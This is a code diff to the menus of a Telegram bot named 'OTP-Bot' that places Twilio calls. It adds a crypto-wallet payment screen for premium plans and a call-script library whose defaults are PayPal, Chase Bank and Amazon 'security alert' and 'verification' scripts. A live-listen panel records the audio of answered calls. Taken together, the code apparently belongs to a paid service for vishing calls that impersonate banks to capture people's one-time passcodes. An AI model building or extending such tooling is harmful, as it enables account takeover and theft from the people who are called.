@@ -26,10 +26,15 @@ from core.auth import (
     get_panel_status_text,
 )
 from core.files import read_user_file, user_conf_path
-from core.premium import get_unused_premium_keys, get_key_stats
-from services.twilio_service import get_current_call_sid, get_call_status
+from premium import get_unused_premium_keys, get_key_stats
+from twilio_service import get_current_call_sid, get_call_status
 
 logger = logging.getLogger("OTP-Bot.menu")
+
+
+def _get_bot():
+    from bot import bot as telegram_bot
+    return telegram_bot
 
 
 def get_live_listen_event(user_id_str: str) -> str:
@@ -80,6 +85,7 @@ def send_main_menu(
         user: Telegram user object
         message_id: If provided, edit existing message instead of sending new
     """
+    bot = _get_bot()
     status_text = get_panel_status_text(str(user.id))
     
     text = (
@@ -162,6 +168,7 @@ def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
         chat_id: Telegram chat ID
         message_id: If provided, edit existing message
     """
+    bot = _get_bot()
     text = (
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"{ICONS['shop']} <b>PREMIUM SHOP</b> {ICONS['shop']}\n"
@@ -202,6 +209,90 @@ def send_shop_menu(chat_id: int, message_id: Optional[int] = None) -> None:
     )
     buttons.add(
         types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="back_to_menu")
+    )
+    
+    if message_id:
+        try:
+            bot.edit_message_text(
+                text,
+                chat_id=chat_id,
+                message_id=message_id,
+                reply_markup=buttons,
+                parse_mode="HTML",
+                disable_web_page_preview=True,
+            )
+        except Exception as e:
+            logger.debug(f"Edit failed, sending new message: {e}")
+            bot.send_message(
+                chat_id,
+                text,
+                reply_markup=buttons,
+                parse_mode="HTML",
+                disable_web_page_preview=True,
+            )
+    else:
+        bot.send_message(
+            chat_id,
+            text,
+            reply_markup=buttons,
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+        )
+
+def send_wallet_menu(
+    chat_id: int,
+    plan_key: str,
+    plan_name: str,
+    price: str,
+    message_id: Optional[int] = None,
+) -> None:
+    """
+    Send wallet addresses for payment with click-to-copy buttons.
+    
+    Args:
+        chat_id: Telegram chat ID
+        plan_key: Plan identifier (e.g., "plan_1day")
+        plan_name: Human-readable plan name
+        price: Price string (e.g., "$16")
+        message_id: If provided, edit existing message
+    """
+    bot = _get_bot()
+    text = (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"💳 <b>PAYMENT ADDRESSES FOR: {plan_name} ({price})</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Click on any wallet address below to copy it:\n\n"
+    )
+    
+    buttons = types.InlineKeyboardMarkup(row_width=1)
+    
+    # Add wallet buttons with click-to-copy
+    for currency, address in PAYMENT_ADDRESSES.items():
+        if address and not address.startswith("_your"):
+            # Create clickable button for each wallet
+            button_text = f"📋 {currency}"
+            buttons.add(
+                types.InlineKeyboardButton(
+                    button_text,
+                    callback_data=f"copy_wallet_{currency}"
+                )
+            )
+            text += f"<b>{currency}</b>:\n<code>{address}</code>\n\n"
+    
+    text += (
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        "✅ After payment, send your transaction proof:\n"
+        "   • Transaction hash\n"
+        "   • Screenshot\n"
+        "   • Payment link\n\n"
+        "Then click VERIFY PAYMENT below 👇\n"
+    )
+    
+    buttons.add(
+        types.InlineKeyboardButton("✅ VERIFY PAYMENT", callback_data=f"verify_payment_{plan_key}")
+    )
+    buttons.add(
+        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="open_shop")
     )
     
     if message_id:
@@ -386,23 +477,21 @@ def send_scripts_menu(chat_id: int, message_id: Optional[int] = None) -> None:
         message_id: If provided, edit existing message
     """
     text = (
-        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{ICONS['scripts']} <b>HOTTBOIIHITZZ · SCRIPTS MANAGER</b> {ICONS['scripts']}\n"
+        "📚 <b>SCRIPT LIBRARY</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "Build and store your call scripts in a clean, pro-style library.\n"
-        "Each script is ready for instant launch without slow loading screens.\n"
+        "📌 <b>Default Scripts:</b>\n"
+        "1. PayPal Security Alert\n"
+        "2. Chase Bank Fraud Alert\n"
+        "3. Amazon Account Verification\n\n"
+        "📌 <b>My Saved Scripts:</b> (0)\n\n"
+        "✨ Create New Script\n"
+        "📋 Paste Custom Script\n"
     )
     
-    buttons = types.InlineKeyboardMarkup(row_width=2)
-    buttons.add(
-        types.InlineKeyboardButton("✨ CREATE NEW", callback_data="create_script")
-    )
-    buttons.add(
-        types.InlineKeyboardButton("📚 MY LIBRARY", callback_data="my_scripts")
-    )
-    buttons.add(
-        types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="account")
-    )
+    buttons = types.InlineKeyboardMarkup(row_width=1)
+    buttons.add(types.InlineKeyboardButton("✨ CREATE NEW", callback_data="create_script"))
+    buttons.add(types.InlineKeyboardButton("📋 PASTE CUSTOM", callback_data="paste_script_to_library"))
+    buttons.add(types.InlineKeyboardButton(f"{ICONS['back']} Back", callback_data="account"))
     
     if message_id:
         try:
@@ -597,8 +686,8 @@ def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
     # Fetch call status
     try:
         call_status = get_call_status(sid) or "unknown"
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ Unable to fetch live call data: {e}")
+    except Exception:
+        bot.send_message(chat_id, "❌ Unable to fetch call data")
         return
     
     status_labels = {
@@ -616,10 +705,9 @@ def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
     lines = [
         f"{ICONS['live']} <b>LIVE LISTEN PANEL</b>",
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
-        f"• Call SID: <code>{sid}</code>",
         f"• Status: <b>{formatted_status}</b>",
         "",
-        "Live listen is active while the call is in progress.",
+        "Monitoring is active while the call is in progress.",
         "If the caller answers, the call audio will be recorded and available below.",
     ]
     
@@ -627,7 +715,7 @@ def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
     buttons = types.InlineKeyboardMarkup(row_width=1)
     
     if call_status in ["queued", "ringing", "in-progress"]:
-        lines.append("\n✅ Live listen is enabled — monitoring the call now.")
+        lines.append("\n✅ Monitoring the call now.")
 
     live_event = get_live_listen_event(user_id_str)
     if live_event:
@@ -729,6 +817,7 @@ def send_analytics_menu(chat_id: int, message_id: Optional[int] = None, user_id_
 __all__ = [
     'send_main_menu',
     'send_shop_menu',
+    'send_wallet_menu',
     'send_account_menu',
     'send_loyalty_menu',
     'send_scripts_menu',
